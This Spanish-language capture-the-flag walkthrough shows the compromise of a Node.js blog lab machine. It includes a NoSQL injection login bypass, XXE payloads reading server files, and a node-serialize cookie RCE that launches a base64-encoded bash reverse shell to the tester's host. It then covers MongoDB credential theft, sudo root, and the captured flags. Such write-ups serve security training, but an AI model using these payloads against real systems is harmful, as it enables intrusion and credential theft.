
![[20250723110122.png]](nodeblog-images/20250723110122.png)

# Fase de Reconocimiento

hacemos un escaneo básico de puertos con nmap 

```bash
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.129.96.160 -oG allPorts
```

![[20250723110306.png]](nodeblog-images/20250723110306.png)

una vez sabemos los puertos abiertos haremos un segundo escaneo con scripts basicos de nmap para sacar el servicio y la version que corren por detras


```bash
nmap -p22,5000 -sCV 10.129.96.160 -oN targeted
```

![[20250723110436.png]](nodeblog-images/20250723110436.png)

vemos que en el puerto 5000 hay un http y la versión es Node.js

## Explorando http

![[20250723110602.png]](nodeblog-images/20250723110602.png)

vemos este menú donde nos dejan ingresar a la pagina

al pulsar en Login nos piden credenciales de acceso que no sabemos
![[20250723110641.png]](nodeblog-images/20250723110641.png)

probamos a meter cualquier cosa

![[20250723110708.png]](nodeblog-images/20250723110708.png)

pruebo típicas credenciales de acceso 

![[20250723110729.png]](nodeblog-images/20250723110729.png)

podemos ver que dice invalid password quiero pensar que el usuario es correcto entonces. para comprobarlo vamos a poner credenciales   diferentes

asd:admin123

![[20250723110826.png]](nodeblog-images/20250723110826.png)

efectivamente ahora me dice que el usuario es invalido por lo que admin es un usuario existente en el sistema 

# Fase de explotación

Lo primero que hay que hacer es romper ese panel de Login así que vamos a probar con inyecciones SQL. Adelanto que por inyecciones de SQL no sacamos nada por lo que busque en payloadsAllTheThings para ver algo que no estoy contemplando.

![[20250723111326.png]](nodeblog-images/20250723111326.png)

vemos este apartado de NoSQL Injection que no he probado así que seguimos investigando 

![[20250723111455.png]](nodeblog-images/20250723111455.png)

aqui vemos que podemos tratar de hacerlo por HTTP data o por JSON data asi que vamos a probar 

## Burpsuite

interceptamos la petición de Login con burpsuite y lo mandamos al repeater


![[20250723111638.png]](nodeblog-images/20250723111638.png)

por http data no conseguimos nada asi que vamos a probar con json


![[20250723111747.png]](nodeblog-images/20250723111747.png)

esta sera la peticion en formato json como hasta ahora nos estaba interpretando esto `Content-Type: application/x-www-form-urlencoded` tenemos que cambiarlo por `Content-Type: application/json` para que nos interprete el json

```json
{
	"user":"admin",
	"password":{
	"$ne":"admin"
		}

}
```

aqui estamos utilizando la función `$ne` que significa que "admin" no es la contraseña. estamos declarando admin como usuario que sabemos que es valido
y en la parte de la contraseña le decimos que no es admin tratando de confundir a la maquina ya que la contraseña sabemos que no es admin



![[20250723112110.png]](nodeblog-images/20250723112110.png)

al enviar la petición vemos que nos genera una cookie de sesion por lo que parece que es funcional.

vamos a tratar de hacerlo directamente en el panel de login 

interceptamos una nueva petición

![[20250723112251.png]](nodeblog-images/20250723112251.png)

cambiamos el cuerpo de la peticion de esto:

```json
POST /login HTTP/1.1
Host: 10.129.96.160:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://10.129.96.160:5000
Connection: keep-alive
Referer: http://10.129.96.160:5000/login
Upgrade-Insecure-Requests: 1
Priority: u=0, i

user=admin&password=admin123
```

a esto:

```json
POST /login HTTP/1.1
Host: 10.129.96.160:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 60
Origin: http://10.129.96.160:5000
Connection: keep-alive
Referer: http://10.129.96.160:5000/login
Upgrade-Insecure-Requests: 1
Priority: u=0, i

{
	"user":"admin",
	"password":{
	"$ne":"admin"
		}

}
```

y pulsamos en Forward para dejar que la petición continúe ya que la tenemos interceptada

![[20250723112504.png]](nodeblog-images/20250723112504.png)

Hemos conseguido acceso a la pagina web. ahora tenemos que encontrar la manera de vulnerarla para conseguir una shell

![[20250723112755.png]](nodeblog-images/20250723112755.png)

creamos un archivo tipo texto de prueba para ver si nos permite subirlo a la pagina

![[20250723112830.png]](nodeblog-images/20250723112830.png)

nos dice que debe ser un XML pulsamos Ctrl + U para ver como debe ser el contenido del XML 

![[20250723112903.png]](nodeblog-images/20250723112903.png)

vemos esto

```xml
<post><title>Example Post</title><description>Example Description</description><markdown>Example Markdown</markdown></post>
```

![[20250723113050.png]](nodeblog-images/20250723113050.png)

creamos con nano un archivo xml de prueba y probamos a subirlo a la pagina web

![[20250723113133.png]](nodeblog-images/20250723113133.png)

aparece esto por lo que parece que esta interpretando el archivo que hemos subido puede ser que se acontezca un XXE asi que volvemos a payloadsAllTheThings 
a buscar informacion del ataque

## XXE INJECTION

![[20250723113251.png]](nodeblog-images/20250723113251.png)

![[20250723113350.png]](nodeblog-images/20250723113350.png)

vamos a probar esto, modificamos el archivo que hemos creado "test.xml"

![[20250723113511.png]](nodeblog-images/20250723113511.png)

quedaría  así 

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<post>

<title>test</title>

<description>this is a test</description>

<markdown>&file;</markdown>

</post>
```

vemos que no funciona así que probaremos otro

![[20250723113939.png]](nodeblog-images/20250723113939.png)

este quedaría así 

```xml                                                           
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

<post>

<title>test</title>

<description>this is a test</description>

<markdown>&xxe;</markdown>

</post>
```

![[20250723114027.png]](nodeblog-images/20250723114027.png)

ahora si que lo esta interpretando.

tras probar a revisar varios archivos en el sistema no vemos nada interesante que nos sea útil ahora mismo así que vamos a probar mas cosas.

vamos a tratar de romper la pagina web para que de algún tipo de fallo y nos de informacion sobre la pagina 

![[20250723114452.png]](nodeblog-images/20250723114452.png)

ponemos paréntesis aleatorios en la parte de la password por ejemplo a ver que sucede

![[20250723114528.png]](nodeblog-images/20250723114528.png)

y vemos en la respuesta un error que nos muestra el directorio /opt/blog donde podemos pensar que esta almacenada toda la data de la web

tras investigar un poco descubro que lo que esta montado en NODE.js suele tener un archivo server.js y tras averiguar que la pagina se monta en /opt/blog vamos a tratar de leer el archivo server.js con el XXE que ya tenemos 


modificamos el archivo text.xml que teniamos para que quede asi 

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///opt/blog/server.js" >]>

<post>

<title>test</title>

<description>this is a test</description>

<markdown>&xxe;</markdown>

</post>
```

hemos cambiado la linea de:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
```

por:

```xml
<!ENTITY xxe SYSTEM "file:///opt/blog/server.js" >]>
```

![[20250723114931.png]](nodeblog-images/20250723114931.png)

vemos que si que existe este archivo en el sistema y confirmamos que la pagina web se almacena en /opt/blog


descubrimos que la aplicacion deserializa la cookie para tramitar datos por lo que tenemos que inyectar codigo serializado en la cookie de sesion

ponemos en burpsuite en el decoder esto 

```bash
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 10.10.14.64',function(error, stdout, stderr){ console.log(stdout)});}()"}
```

y lo codificamos en URL


![[20250723130302.png]](nodeblog-images/20250723130302.png)

![[20250723130308.png]](nodeblog-images/20250723130308.png)

nos copiamos todo el texto codificado y vamos a la raíz de la pagina web

![[20250723130335.png]](nodeblog-images/20250723130335.png)

una vez aqui vamos a a pulsar f12 para ver el almacenamiento de cookies

![[20250723130405.png]](nodeblog-images/20250723130405.png)

cambiamos "Value" por el URL codificado

nos ponemos en escucha de paquetes con tcpdump 

```bash
tcpdump -i tun0 icmp -n
```

refrescamos la pagina web y tenemos conexión, hemos recibido el ping

![[20250723130511.png]](nodeblog-images/20250723130511.png)

## Reverse shell

Ahora utilizaremos la vulnerabilidad que ya conocemos para inyectar una reverse shell y tener acceso al sistema.

lo primero que tenemos que hacer es convertir la petición de shell en base 64 

```bash
echo 'bash -i >& /dev/tcp/10.10.14.64/443 0>&1' | base64
```

obtendremos un resultado como este 

```bash
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42NC80NDMgMD4mMQo=
```

Una vez tenemos esto vamos a crear el código que queremos que ejecute la maquina victima

```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42NC80NDMgMD4mMQo= |base64 -d |bash
```

vamos a explicar este código en detalle:

```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42NC80NDMgMD4mMQo=
```

lo que hace es literalmente mostrar por pantalla esto `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42NC80NDMgMD4mMQo=`

```bash
base64 -d 
```

lo que hace es decodificar el base64 para que se vea la data en texto plano veríamos esto `'bash -i >& /dev/tcp/10.10.14.64/443 0>&1' `

```bash
bash
```

lo que hace es ejecutar el texto decodificado con bash

por lo que el código diría algo así. 

"Quiero que decodifiques esto YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42NC80NDMgMD4mMQo= una vez que tengas  esto `'bash -i >& /dev/tcp/10.10.14.64/443 0>&1'` ejecútalo con bash "

si haces la prueba em tu terminal y te pones en escucha por el puerto 443 en este caso recibirás una shell de tu propia maquina.

Para que esto lo interprete la IP VICTIMA en la pagina web tenemos que ponerlo en formato URL en la cookie utilizando el mismo método que usamos al mandarnos el PING

```bash
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42NC80NDMgMD4mMQo= |base64 -d |bash',function(error, stdout, stderr){ console.log(stdout)});}()"}
```

![[20250724094919.png]](nodeblog-images/20250724094919.png)

![[20250724094929.png]](nodeblog-images/20250724094929.png)

esto lo pegaremos en la pagina index.txt pulsando F12 y cambiando el valor de la cookie

![[20250724095020.png]](nodeblog-images/20250724095020.png)
en nuestra terminal nos ponemos en escucha por el puerto 443 


```bash
nc -nlvp 443
```

y pulsamos F5 en la pagina de la IP VICTIMA  para actualizarla y que se ejecute el ataque

![[20250724095138.png]](nodeblog-images/20250724095138.png)

recibiremos una Shell

## Tratamiento de Shell

pondremos el comando
```bash
script /dev/null -c bash
```

pulsamos Ctrl + Z 

```bash
stty raw -echo; fg
```

ponemos 
```bash
export TERM=xterm
```

y una vez dentro de la terminal ponemos

```bash
export SHELL=/bin/bash
```

# Escalada de privilegios

lo primero que miramos siempre es sudo -l para ver si tenemos opción de ejecutar algo como root

![[20250724095630.png]](nodeblog-images/20250724095630.png)

me pide contraseña y yo no me la se

mirando con el comando 

```bash
netstat -nat
```

podemos ver los puertos abiertos internos de la maquina ya que con nmap solo tenemos acceso a los puertos abiertos de forma externa

![[20250724095832.png]](nodeblog-images/20250724095832.png)

el puerto 27017 nos interesa por que buscando en Google vemos que esta relacionado con la base de datos MongoDB por lo que igual podemos conseguir algo por ahi

Pongo en la consola "mongo" para tratar de conectarme a la base de datos y efectivamente nos podemos conectar sin problemas

![[20250724100014.png]](nodeblog-images/20250724100014.png)

poniendo el comando 
```bash
help
```

nos dará informacion de lo que podemos hacer

![[20250724100054.png]](nodeblog-images/20250724100054.png)

empecemos a investigar

![[20250724100128.png]](nodeblog-images/20250724100128.png)

aqui vemos varias bases de datos. después de estar explorando un poco os muestro la ruta a seguir para llegar a la contraseña

![[20250724100432.png]](nodeblog-images/20250724100432.png)

```bash
show dbs
```

```bash
use blog
```

```bash
show collections
```

```bash
db.users.find()
```

y ahí podemos ver la contraseña de admin que seria  " `IppsecSaysPleaseSubscribe`"


nos salimos de la base de datos poniendo "exit"

y probamos sudo -l con la contraseña

![[20250724100637.png]](nodeblog-images/20250724100637.png)
ahora si tenemos acceso y vemos que podemos ejecutar cualquier comando como root desde cualquier usuario

así que ponemos :

```bash
sudo su
```

![[20250724100748.png]](nodeblog-images/20250724100748.png)

y tenemos acceso como root


# Flags

## user

en el directorio: /home/admin

user: a117912dee418d6ba43f910e5d5d8d95

![[20250724100850.png]](nodeblog-images/20250724100850.png)

## root

en el directorio: /root

root : 6f4c97d91aa14ff42e7955d220e52541

![[20250724100945.png]](nodeblog-images/20250724100945.png)
